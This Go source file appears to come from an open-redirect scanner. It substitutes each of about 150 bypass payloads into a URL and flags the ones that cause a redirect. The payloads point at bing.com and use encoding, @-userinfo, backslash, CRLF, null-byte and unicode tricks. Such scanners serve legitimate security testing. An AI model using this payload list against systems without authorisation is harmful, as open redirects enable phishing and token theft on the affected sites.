package core

import (
  "errors"
  "strings"
  "net/http"
)

func CheckRedirect(url string, c *http.Client, payloads []string, keyword string) ([]string, error) {

  var open_redirects []string

  var redirect_err = errors.New("redirect")
  redirect := func(req *http.Request, via []*http.Request) (error) {
    return redirect_err
  }

  c.CheckRedirect = redirect

  for _, payload := range payloads {
    new_url := strings.Replace(url, keyword, payload, -1)

    req, err := http.NewRequest("GET", new_url, nil)
    if err != nil {
      continue
    }

    req.Header.Add("Connection", "close")
    req.Close = true

    _, err = c.Do(req) // Send requests with out custom client config
    if (errors.Is(err, redirect_err)) { // Check if error is due to redirect
      open_redirects = append(open_redirects, payload)
    }
  }

  return open_redirects, nil
}

func GetPayloads() ([]string) {
  return payloads
}

var payloads = []string{
  "//bing.com", 
  "bing.com/", 
  "https://www.bing.com", 
  "www.bing.com", 
  "%2520%252f%252fbing.com", 
  ".bing.com", 
  "..bing.com", 
  "///example.com@bing.com/%2f..", 
  "//bing.com/%2f", 
  "//example.com@bing.com/%2f..", 
  "///bing.com/%2f..", 
  "////bing.com/%2f..", 
  "////example.com@bing.com/%2f..", 
  "https://bing.com/%2f..", 
  "%09http:///example.com%40bing.com", 
  "////bing%E3%80%82com", 
  "//bing.com?", 
  "///www.example.com@bing.com/", 
  "http:http://bing.com", 
  "http:/bing%252ecom", 
  "//.@.@bing.com", 
  "°/https://bing.com", 
  "https://bing.comğ.example.com", 
  "https://example.com@bing.com/%2f..", 
  "/https://bing.com/%2f..", 
  "/https://example.com@bing.com/%2f..", 
  "https://bing.com/%2f%2e%2e", 
  "https://example.com@bing.com/%2f%2e%2e", 
  "/https://bing.com/%2f%2e%2e", 
  "/https://example.com@bing.com/%2f%2e%2e", 
  "//bing.com/", 
  "///example.com@bing.com/", 
  "////bing.com/", 
  "////example.com@bing.com/", 
  "https://bing.com/", 
  "https://example.com@bing.com/", 
  "/https://bing.com/", 
  "/https://example.com@bing.com/", 
  "//bing.com//", 
  "//example.com@bing.com//", 
  "///bing.com//", 
  "///example.com@bing.com//", 
  "//https://bing.com//", 
  "//https://example.com@bing.com//", 
  "//bing.com/%2e%2e%2f", 
  "//example.com@bing.com/%2e%2e%2f", 
  "///bing.com/%2e%2e%2f", 
  "///example.com@bing.com/%2e%2e%2f", 
  "////bing.com/%2e%2e%2f", 
  "////example.com@bing.com/%2e%2e%2f", 
  "https://bing.com/%2e%2e%2f", 
  "https://example.com@bing.com/%2e%2e%2f", 
  "//https://bing.com/%2e%2e%2f", 
  "//https://example.com@bing.com/%2e%2e%2f", 
  "////bing.com/%2e%2e", 
  "////example.com@bing.com/%2e%2e", 
  "https:///bing.com/%2e%2e", 
  "https:///example.com@bing.com/%2e%2e", 
  "//https:///bing.com/%2e%2e", 
  "//example.com@https:///bing.com/%2e%2e", 
  "/https://bing.com/%2e%2e", 
  "/https://example.com@bing.com/%2e%2e", 
  "///bing.com/%2f%2e%2e", 
  "///example.com@bing.com/%2f%2e%2e", 
  "////bing.com/%2f%2e%2e", 
  "////example.com@bing.com/%2f%2e%2e", 
  "https:///bing.com/%2f%2e%2e", 
  "https:///example.com@bing.com/%2f%2e%2e", 
  "/https://bing.com/%2f%2e%2e", 
  "/https://example.com@bing.com/%2f%2e%2e", 
  "/https:///bing.com/%2f%2e%2e", 
  "/https:///example.com@bing.com/%2f%2e%2e", 
  "/%09/bing.com", 
  "/%09/example.com@bing.com", 
  "//%09/bing.com", 
  "//%09/example.com@bing.com", 
  "///%09/bing.com", 
  "///%09/example.com@bing.com", 
  "////%09/bing.com", 
  "////%09/example.com@bing.com", 
  "https://%09/bing.com", 
  "https://%09/example.com@bing.com", 
  "/%5cbing.com", 
  "/%5cexample.com@bing.com", 
  "//%5cbing.com", 
  "//%5cexample.com@bing.com", 
  "///%5cbing.com", 
  "///%5cexample.com@bing.com", 
  "////%5cbing.com", 
  "////%5cexample.com@bing.com", 
  "https://%5cbing.com", 
  "https://%5cexample.com@bing.com", 
  "/https://%5cbing.com", 
  "/https://%5cexample.com@bing.com", 
  "https://bing.com", 
  "https://example.com@bing.com", 
  "//bing.com", 
  "https:bing.com", 
  "//bing%E3%80%82com", 
  "\\/\\/bing.com/", 
  "/\\/bing.com/", 
  "//bing%00.com", 
  "https://example.com/https://bing.com/", 
  "http://[::204.79.197.200]", 
  "http://example.com@[::204.79.197.200]", 
  "http://3H6k7lIAiqjfNeN@[::204.79.197.200]", 
  "http:0xd83ad6ce", 
  "http:example.com@0x62696e672e636f6d", 
  "http:[::204.79.197.200]", 
  "http:example.com@[::204.79.197.200]", 
  "〱bing.com", 
  "〵bing.com", 
  "ゝbing.com", 
  "ーbing.com", 
  "ｰbing.com", 
  "/〱bing.com", 
  "/〵bing.com", 
  "/ゝbing.com", 
  "/ーbing.com", 
  "/ｰbing.com", 
  "<>//bing.com", 
  "//bing.com\\@example.com", 
  "https://:@bing.com\\@example.com", 
  "http://bing.com:80#@example.com/", 
  "http://bing.com:80?@example.com/", 
  "http://bing.com	example.com/", 
  "//bing.com:80#@example.com/", 
  "//bing.com:80?@example.com/", 
  "//bing.com	example.com/", 
  "http://;@bing.com", 
  "@bing.com", 
  "http://bing.com%2f%2f.example.com/", 
  "http://bing.com%5c%5c.example.com/", 
  "http://bing.com%3F.example.com/", 
  "http://bing.com%23.example.com/", 
  "http://example.com:80%40bing.com/", 
  "/https:/%5cbing.com/", 
  "/http://bing.com", 
  "/%2f%2fbing.com", 
  "/bing.com/%2f%2e%2e", 
  "/http:/bing.com", 
  "/.bing.com", 
  "///\\;@bing.com", 
  "///bing.com", 
  "/////bing.com/", 
  "/////bing.com", 
  "/%0D/bing.com", 
  "/%0D%0Ahttp://bing.com/", 
  "%20//bing.com", 
}




